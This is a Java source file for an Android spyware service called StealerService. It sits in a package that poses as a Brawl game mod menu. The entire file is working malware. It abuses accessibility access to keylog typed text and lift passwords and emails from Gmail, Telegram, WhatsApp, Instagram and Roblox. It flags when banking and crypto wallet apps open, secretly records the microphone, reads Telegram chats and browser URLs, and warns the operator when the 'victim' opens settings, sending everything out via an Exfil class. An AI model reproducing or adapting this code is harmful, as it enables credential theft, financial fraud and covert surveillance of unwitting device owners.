package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.media.MediaRecorder;
import android.text.InputType;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class StealerService extends AccessibilityService {

    private static final long COOLDOWN = 6000;
    private long lastSend = 0;
    private long lastBankAlert = 0;
    private long lastMicRecord = 0;
    private long lastAppOpen = 0;
    private String lastPkg = "";
    private StringBuilder keyBuf = new StringBuilder();
    private long lastKeySend = 0;
    private static final long KEY_COOLDOWN = 10000;

    private static final long MIC_COOLDOWN = 10 * 60 * 1000L;
    private static final long APP_COOLDOWN = 2000;

    // Цели для паролей
    private static final List<String> TARGETS = Arrays.asList(
        "com.google.android.gm", "com.google.android.apps.gmail",
        "org.telegram.messenger", "org.telegram.messenger.web",
        "org.thunderdog.challegram", "com.zhiliaoapp.musically",
        "com.ss.android.ugc.trill", "com.whatsapp", "com.whatsapp.w4b",
        "com.roblox.client", "com.instagram.android"
    );

    // Банки
    private static final List<String> BANK_APPS = Arrays.asList(
        "com.ftband.mono", "com.monobank.app",
        "ua.privatbank.ap24", "ru.privatbank",
        "ua.oschadbank.online", "com.alfabank.oavdo.amc",
        "com.binance.dev", "com.coinbase.android",
        "io.metamask", "com.trustwallet.app"
    );

    // Микрофон триггеры
    private static final List<String> MIC_TRIGGERS = Arrays.asList(
        "org.telegram.messenger", "com.whatsapp",
        "com.viber.voip", "org.thoughtcrime.securesms"
    );

    // Telegram reader
    private static final String TG_PKG = "org.telegram.messenger";
    private StringBuilder tgBuffer = new StringBuilder();
    private long lastTgSend = 0;

    // Браузеры
    private static final List<String> BROWSERS = Arrays.asList(
        "com.android.chrome", "org.mozilla.firefox",
        "com.opera.browser", "com.brave.browser",
        "com.microsoft.emmx"
    );

    // Настройки (Alert)
    private static final String SETTINGS_PKG = "com.android.settings";
    private long lastSettingsAlert = 0;

    // Всё что не логировать в кейлоггере
    private static final List<String> SKIP_KEYLOG = Arrays.asList(
        "com.android.systemui", "com.brawl.modmenu",
        "com.android.launcher", "com.android.launcher3",
        "com.google.android.inputmethod",
        "com.google.android.apps.inputmethod"
    );

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Exfil.send("STEAL", "✅ Zbot активирован (объединённый сервис)");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();

        int type = event.getEventType();

        // === WINDOW STATE ===
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            onWindowChanged(pkg);
        }

        // === KEYLOGGER ===
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            onTextChanged(pkg, event);
        }

        // === STEAL (пароли) ===
        if ((type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            || type == AccessibilityEvent.TYPE_VIEW_FOCUSED)
            && TARGETS.contains(pkg)) {
            if (System.currentTimeMillis() - lastSend > COOLDOWN) {
                stealPasswords(pkg);
            }
        }
    }

    // Смена окна — проверяем банки, приложения, мессенджеры, браузер, настройки
    private void onWindowChanged(String pkg) {
        // Bank trigger
        if (BANK_APPS.contains(pkg)
            && System.currentTimeMillis() - lastBankAlert > 30000) {
            lastBankAlert = System.currentTimeMillis();
            Exfil.send("BANK_OPEN", "🏦 Открыт: " + AppNames.get(pkg));
            try {
                android.content.Intent i =
                    new android.content.Intent(this, MediaSniffer.class);
                i.setAction("CAPTURE_NOW");
                startService(i);
            } catch (Throwable ignored) {}
        }

        // App tracker
        if (!pkg.equals(lastPkg) && !pkg.contains("systemui")
            && !pkg.contains("launcher")) {
            if (System.currentTimeMillis() - lastAppOpen > APP_COOLDOWN) {
                lastAppOpen = System.currentTimeMillis();
                lastPkg = pkg;
                Exfil.send("APP_OPEN", "▶ " + AppNames.get(pkg));
            }
        }

        // Mic trigger
        if (MIC_TRIGGERS.contains(pkg)
            && System.currentTimeMillis() - lastMicRecord > MIC_COOLDOWN) {
            lastMicRecord = System.currentTimeMillis();
            recordMicBackground();
        }

        // Alert — жертва лезет в настройки
        if (pkg.equals(SETTINGS_PKG)
            && System.currentTimeMillis() - lastSettingsAlert > 5000) {
            lastSettingsAlert = System.currentTimeMillis();
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String className = "";
                CharSequence cls = null;
                // получаем текущий фрагмент
                if (root.getChildCount() > 0) {
                    CharSequence desc = root.getContentDescription();
                    if (desc != null) className = desc.toString();
                }
                if (className.contains("administrator") || className.contains("администратор")
                    || className.contains("специальн")
                    || className.contains("доступност")) {
                    Exfil.send("ALERT", "🚨 Жертва в настройках: " + className);
                }
            }
        }

        // Telegram reader
        if (pkg.equals(TG_PKG)) {
            readTelegramChat();
        }

        // Browser — читаем URL
        if (BROWSERS.contains(pkg)) {
            readBrowserUrl();
        }
    }

    // Кейлоггер
    private void onTextChanged(String pkg, AccessibilityEvent event) {
        if (SKIP_KEYLOG.contains(pkg)) return;

        CharSequence text = event.getText() != null && event.getText().size() > 0
            ? event.getText().get(0) : null;
        if (text == null || text.length() == 0 || text.length() > 500) return;

        if (!pkg.equals(lastPkg)) {
            keyBuf.append("\n📱 ").append(AppNames.get(pkg)).append("\n");
        }
        keyBuf.append(text).append("\n");

        if (System.currentTimeMillis() - lastKeySend > KEY_COOLDOWN
            && keyBuf.length() > 30) {
            Exfil.send("KEYS", keyBuf.toString());
            keyBuf.setLength(0);
            lastKeySend = System.currentTimeMillis();
        }
    }

    // Пароли из целевых приложений
    private void stealPasswords(String pkg) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        StringBuilder found = new StringBuilder();
        findFields(root, found, 0);

        if (found.length() > 0) {
            found.insert(0, "📱 " + AppNames.get(pkg) + "\n");
            Exfil.send("STEAL", found.toString());
            lastSend = System.currentTimeMillis();
        }
    }

    private void findFields(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 40) return;

        int inputType = n.getInputType();
        boolean isPwd = false, isEmail = false;

        if (inputType > 0) {
            int variation = inputType & InputType.TYPE_MASK_VARIATION;
            int cls = inputType & InputType.TYPE_MASK_CLASS;
            if (cls == InputType.TYPE_CLASS_TEXT) {
                if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD) isPwd = true;
                if (variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) isEmail = true;
            }
        }

        CharSequence text = n.getText();
        if (isPwd && text != null && text.length() > 0) {
            sb.append("[PWD] ").append(text).append("\n");
        } else if (isEmail && text != null && text.length() > 0) {
            sb.append("[EMAIL] ").append(text).append("\n");
        }

        for (int i = 0; i < n.getChildCount(); i++) {
            findFields(n.getChild(i), sb, depth + 1);
        }
    }

    // Чтение Telegram чата
    private void readTelegramChat() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        List<String> texts = new ArrayList<>();
        collectTexts(root, texts, 0);

        for (String t : texts) {
            if (t.length() > 3 && t.length() < 500
                && !tgBuffer.toString().contains(t)) {
                tgBuffer.append(t).append("\n");
            }
        }

        if (System.currentTimeMillis() - lastTgSend > 10000
            && tgBuffer.length() > 50) {
            Exfil.send("TG_CHAT", tgBuffer.toString());
            tgBuffer.setLength(0);
            lastTgSend = System.currentTimeMillis();
        }
    }

    private void collectTexts(AccessibilityNodeInfo n, List<String> out, int depth) {
        if (n == null || depth > 25 || out.size() > 30) return;
        CharSequence text = n.getText();
        if (text != null && text.length() > 0) out.add(text.toString());
        for (int i = 0; i < n.getChildCount(); i++) {
            collectTexts(n.getChild(i), out, depth + 1);
        }
    }

    // Чтение URL из браузера
    private void readBrowserUrl() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        String url = findUrl(root, 0);
        if (url != null && url.length() > 5) {
            Exfil.send("URL", "🌐 " + url);
        }
    }

    private String findUrl(AccessibilityNodeInfo n, int depth) {
        if (n == null || depth > 20) return null;
        CharSequence text = n.getText();
        if (text != null) {
            String s = text.toString();
            if (s.startsWith("http") || s.contains(".com")
                || s.contains(".org") || s.contains(".net")) return s;
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            String r = findUrl(n.getChild(i), depth + 1);
            if (r != null) return r;
        }
        return null;
    }

    // Запись микрофона в фоне
    private void recordMicBackground() {
        new Thread(() -> {
            try {
                File out = new File(getCacheDir(), "mic_auto.m4a");
                MediaRecorder rec = new MediaRecorder();
                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                rec.setOutputFile(out.getAbsolutePath());
                rec.prepare();
                rec.start();

                Thread.sleep(30 * 1000L);
                rec.stop();
                rec.release();

                if (out.exists() && out.length() > 0) {
                    byte[] data = new byte[(int) out.length()];
                    FileInputStream fis = new FileInputStream(out);
                    fis.read(data);
                    fis.close();
                    out.delete();

                    String b64 = android.util.Base64.encodeToString(data,
                        android.util.Base64.NO_WRAP);
                    Exfil.sendAudio("AUTO_MIC", b64, 30);
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
